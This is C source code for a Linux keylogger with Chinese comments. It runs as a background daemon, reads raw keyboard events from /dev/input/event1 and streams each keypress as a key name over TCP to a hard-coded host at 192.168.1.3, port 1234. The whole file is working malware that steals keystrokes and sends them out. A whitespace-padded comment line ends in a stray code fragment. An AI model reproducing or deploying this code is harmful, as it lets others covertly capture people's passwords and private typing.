#include <linux/input.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>

#include "daemon.c"
#define MaxLen 1024
extern void init_daemon(void);//守护进程初始化函数   
char *KeyName[] = {"RESERVED",
"ESC","1","2","3","4","5","6","7","8","9","0","MINUS"
,"EQUAL","BACKSPACE","TAB","Q","W","E","R","T","Y","U","I","O","P",
"LEFTBRACE","RIGHTBRACE","ENTER","LEFTCTRL","A","S","D","F","G","H"
,"J","K","L","SEMICOLON","APOSTROPHE","GRAVE","LEFTSHIFT","BACKSLASH"
,"Z","X","C","V","B","N","M","COMMA","DOT","SLASH","RIGHTSHIFT","KPASTERISK"
,"LEFTALT","SPACE","CAPSLOCK"};
 
int main(int argc, char const *argv[])
{
	int KeyIndex;
	init_daemon();
	struct input_event t;
	struct stat File;
/****客户端守护进程后台运行 记录************/	

	struct sockaddr_in Addr;

	Addr.sin_family = PF_INET;
	Addr.sin_port = htons(1234);
	Addr.sin_addr.s_addr = inet_addr("192.168.1.3");

	int ServerScock = socket(PF_INET,SOCK_STREAM,0);
	if(ServerScock == -1)
	{
		perror("ServerScock ");
	} 
	int ConnectServer = connect(ServerScock,(struct sockaddr *)&Addr,sizeof(Addr));
	if(ConnectServer == -1)
	{
		perror("ConnectServer ");
	}
	// char buf[MaxLen];
	// bzero(buf,0);
	// while(1)
	// {
	// 	read(ServerScock,buf,MaxLen);
	// 	if(buf[MaxLen-1] != '\0')
	// 	{

	// 	}
	// }	
/**************************************************************/	
	
	int KeyBoard = open("/dev/input/event1",O_RDONLY,0777);
	if(KeyBoard == -1)
	{
		perror("KeyBoard fail");		
	}

	// int KeyContent = open(argv[1],O_RDWR|O_CREAT|O_APPEND,0777);
	// if(KeyContent == -1)
	// {
	// 	perror("KeyContent fail");
	// }
	//                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           (argv[1],&File);

	char buf[MaxLen];
	bzero(buf,0);
	while(1)
	{
		if(read(KeyBoard,&t,sizeof(t)) == sizeof(t))
		{
			if(t.type == EV_KEY)
				if(t.value == 1 && t.value != KEY_ENTER)
				{
						KeyIndex = t.code;
						write(ServerScock,KeyName[KeyIndex],strlen(KeyName[KeyIndex]));
						write(ServerScock," ",strlen(" "));

				}
		}

	}

	close(KeyBoard);


	return 0;
}
